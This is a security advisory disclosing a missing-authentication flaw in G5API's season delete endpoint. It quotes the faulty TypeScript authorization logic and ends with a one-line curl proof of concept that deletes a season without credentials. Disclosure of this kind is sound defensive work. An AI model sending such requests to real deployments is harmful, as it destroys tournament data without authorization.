# Vulnerability Report

## Summary
- **Title**: Missing Authentication on Season Delete Endpoint in G5API
- **Affected Version**: all versions (as of 2026-06-28)
- **CWE**: CWE-306 - Missing Authentication for Critical Function
- **CVSS 3.1 Score**: 7.5 High (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)
- **Vendor**: PhlexPlexico
- **Product**: G5API
- **Repository**: https://github.com/PhlexPlexico/G5API

## Description

G5API contains a missing authentication vulnerability on the `DELETE /seasons` endpoint in `src/routes/seasons.ts`. Unlike other state-changing routes in the application that use `Utils.ensureAuthenticated` middleware, the season delete route does not require authentication.

The authorization check at line 553-557 only fires when `req.user` is defined (truthy). For unauthenticated requests, `req.user` is `undefined`, causing the `else if` condition to evaluate to `false`, and execution falls through to the `else` block which performs the delete operation.

```typescript
// Line 547 - NO ensureAuthenticated middleware
router.delete("/", async (req, res, next) => {
  // ...
  } else if (
    req.user &&                          // undefined for unauthed → entire expression false
    seasonRow[0].user_id != req.user.id &&
    !Utils.superAdminCheck(req.user)
  ) {
    res.status(403)...  // Never reached for unauthed users
    return;
  } else {
    // DELETE executes here for unauthenticated users
    let deleteSql: string = "DELETE FROM season WHERE id = ?";
    await db.query(deleteSql, [seasonId]);
  }
```

## Proof of Concept

```bash
curl -X DELETE http://target:3301/seasons \
  -H "Content-Type: application/json" \
  -d '[{"season_id": 1}]'
# No authentication needed. Season 1 is deleted.
```

## Impact

Any unauthenticated user can delete any season from the database, disrupting active CS2/CS:GO tournaments and match data.

## Credit
- Discovered by: goutou (https://github.com/goutouanquan)
- Contact: goutouanquan@163.com
